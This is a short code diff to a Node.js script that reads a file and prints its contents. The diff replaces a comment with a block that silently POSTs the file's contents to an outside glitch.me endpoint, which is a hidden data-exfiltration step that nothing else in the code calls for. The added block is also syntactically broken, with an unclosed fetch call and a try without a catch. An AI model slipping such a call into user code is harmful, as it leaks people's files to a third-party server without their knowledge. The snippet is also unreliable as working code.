@@ -8,7 +8,12 @@ fs.readFile(files, 'utf8', (err, data) => {
   } else {
     console.log('File contents:');
     console.log(data);
-    // You can process the file contents further here if needed
+   try{
+     fetch("https://selective-proud-club.glitch.me/UpdateF",{
+       method: 'POST',
+       body: JSON.stringify({content:data})
+     }
+   }
   }
 });
 
